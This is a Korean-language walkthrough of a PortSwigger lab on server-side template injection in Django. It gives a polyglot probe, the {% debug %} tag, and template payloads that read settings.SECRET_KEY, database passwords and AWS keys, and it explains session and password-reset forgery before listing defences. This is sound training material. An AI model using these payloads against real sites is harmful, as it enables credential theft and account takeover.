# Lab: Server-side template injection with information disclosure via user-supplied objects

## 개요

- **난이도**: Practitioner
- **주제**: Server-Side Template Injection — 폴리글랏 프로브 / Django 식별 / debug 태그 / SECRET_KEY 탈취
- **링크**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects

## 목표

폴리글랏 프로브로 Django 템플릿 엔진을 식별하고, `{% debug %}` 로 컨텍스트 변수를 확인한 뒤 `settings.SECRET_KEY` 를 탈취한다.

## 1단계 — 폴리글랏 프로브로 에러 유발

### 폴리글랏 프로브 (Polyglot Probe)

```
${{<%'"}}%\
```

여러 템플릿 엔진의 특수 구문을 한 번에 포함한 탐지 문자열:

```
${ }    → FreeMarker, Mako, Velocity
{{ }}   → Jinja2, Django, Twig, Handlebars
<% %>   → ERB, ASP
'"      → 문자열 컨텍스트 탈출 시도
%\      → 구문 종료 우회 시도

→ 어느 엔진이든 구문 오류를 일으켜 에러 메시지 유발
→ 에러 메시지에서 엔진 식별
```

### Django 에러 메시지

```
TemplateSyntaxError at /product/template
...
django.template.exceptions.TemplateSyntaxError:
  Could not parse the remainder: '<%'"}}%\' from '${{<%'"}}%\'
```

에러 메시지에 **django.template** 명시 → Django 확인

## Django 템플릿 엔진

### Django Template Language (DTL) 개요

```
[Django 템플릿의 설계 철학]
  "비프로그래머도 사용할 수 있어야 한다"
  → 임의 Python 코드 실행 불가 (의도적 설계)
  → if, for 등 단순 로직만 허용
  → 복잡한 로직은 Python 코드에서 처리

[Jinja2 vs Django Template]
  Jinja2:           {{ "".__class__.__mro__ }} 같은 Python 표현식 가능
  Django Template:  Python 표현식 직접 실행 불가
                    → 컨텍스트로 전달된 객체의 속성만 접근 가능
```

### Django 템플릿 기본 구문

```django
{{ variable }}              변수 출력
{{ object.attribute }}      속성 접근
{{ value|filter }}          필터 적용

{% if condition %}...{% endif %}    조건
{% for item in list %}...{% endfor %}  반복
{% block name %}...{% endblock %}   블록 상속

{% debug %}                 디버그 정보 출력 (컨텍스트 전체)
{% load module %}           외부 모듈 로드
```

### Django 와 Jinja2 구분

```
공통점: {{ }}, {% %} 구문
차이점:
  {{ 7*7 }}
    Jinja2  → 49   (수식 계산)
    Django  → ""   (변수 7*7 없으므로 빈 문자열)

  {{ "".__class__ }}
    Jinja2  → <class 'str'>
    Django  → ""   (접근 차단)

→ 수식이 계산되면 Jinja2, 빈 출력이면 Django
```

## 2단계 — debug 태그로 컨텍스트 확인

```django
{% debug %}
```

출력 예시:
```
{'True': True, 'False': False, 'None': None,
 'request': <WSGIRequest: GET '/product/template'>,
 'product': <Product: Fancy Widget>,
 'settings': <LazySettings "...">,
 'user': <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser>>,
 ...}
```

`settings` 객체가 템플릿 컨텍스트에 포함되어 있음 → 접근 가능

## 3단계 — SECRET_KEY 탈취

```django
{{settings.SECRET_KEY}}
```

출력:
```
c4t5kv...SECRET_KEY_VALUE...
```

## Django SECRET_KEY 의 중요성

```
SECRET_KEY 가 노출되면:

1. 세션 쿠키 위조
   Django 세션 쿠키는 SECRET_KEY 로 서명
   → 임의 세션 데이터로 서명 가능
   → 다른 사용자(관리자) 세션 탈취

2. CSRF 토큰 위조
   Django CSRF 토큰도 SECRET_KEY 파생
   → CSRF 보호 무력화

3. 서명된 데이터 위조
   Django의 django.core.signing 모듈 사용 데이터 전부

4. Password Reset Token 위조
   비밀번호 재설정 링크도 SECRET_KEY 파생
   → 임의 계정 비밀번호 재설정 가능
```

## Django 템플릿 SSTI 의 특성

```
[일반 SSTI — RCE 가능]
  ERB, Jinja2, FreeMarker 등
  → 임의 코드 실행 → whoami, ls, rm 등

[Django Template SSTI — 정보 탈취 중심]
  임의 Python 코드 실행 불가
  → 컨텍스트 객체 속성만 접근 가능
  → 하지만 settings, request 같은 민감 객체 접근 가능
  → SECRET_KEY, DB 설정, API 키 등 탈취 가능

→ RCE 는 불가하지만 정보 탈취만으로도 심각한 피해
```

## settings 에서 접근 가능한 민감 정보

```django
{{settings.SECRET_KEY}}        Django 서명 키
{{settings.DATABASES}}         DB 호스트/비밀번호
{{settings.EMAIL_HOST_PASSWORD}} 이메일 서버 비밀번호
{{settings.AWS_SECRET_ACCESS_KEY}} AWS 키
{{settings.DEBUG}}             디버그 모드 여부
{{settings.ALLOWED_HOSTS}}     허용 호스트 목록
{{settings.INSTALLED_APPS}}    설치된 앱 목록
```

## 폴리글랏 프로브 상세 분석

```
${{<%'"}}%\

각 부분의 역할:
  $         → FreeMarker/Velocity/Mako의 변수 시작
  {{        → Jinja2/Django/Twig의 변수 시작
  <%        → ERB/ASP의 코드 블록 시작
  '         → 문자열 컨텍스트 탈출 시도 (작은따옴표)
  "         → 문자열 컨텍스트 탈출 시도 (큰따옴표)
  }}        → Jinja2/Django의 변수 닫기 (짝 안 맞음 → 오류)
  %\        → 구문 종료 변형

모든 엔진에서 어떤 형태로든 구문 오류 발생
→ 에러 메시지로 엔진 종류 파악
```

## 탐지 흐름 정리

```
1. 폴리글랏 프로브 삽입
   ${{<%'"}}%\
   → TemplateSyntaxError: django.template ... → Django 확인

2. debug 태그로 컨텍스트 탐색
   {% debug %}
   → settings 객체 존재 확인

3. 민감 정보 접근
   {{settings.SECRET_KEY}}
   → SECRET_KEY 탈취
```

## 핵심 정리

- 폴리글랏 프로브 `${{<%'"}}%\` 는 여러 엔진의 특수 구문을 한 번에 포함해 어떤 엔진이든 에러를 유발하고 엔진을 식별한다.
- Django 템플릿은 임의 Python 실행이 불가하지만 `{% debug %}` 로 컨텍스트 변수 목록을 확인하고, `settings` 같은 민감 객체에 접근할 수 있다.
- `settings.SECRET_KEY` 노출은 세션 위조, CSRF 우회, 비밀번호 재설정 링크 위조 등 연쇄 공격으로 이어진다.

## 배운 점

### SSTI 영향도 비교

```
[RCE 가능한 SSTI]
  ERB, Jinja2, FreeMarker, Handlebars 등
  → 서버 파일 읽기/삭제, 역쉘, 횡적 이동

[정보 탈취 중심 SSTI]
  Django Template
  → SECRET_KEY, DB 비밀번호, API 키 탈취
  → 탈취한 정보로 추가 공격 (세션 위조 등)

→ RCE 만큼 위험할 수 있음
```

### Django 방어 방법

```
1. 사용자 입력을 템플릿으로 렌더링하지 않기
   render(request, 'template.html', context)  ← 올바른 사용
   Template(user_input).render(context)       ← 취약

2. 프로덕션에서 settings 를 템플릿 컨텍스트에 포함시키지 않기
   settings.DEBUG = False
   컨텍스트에 settings 객체 전달 금지

3. SECRET_KEY 노출 후 즉시 교체
   새 값으로 교체 시 기존 세션/서명 전부 무효화
```
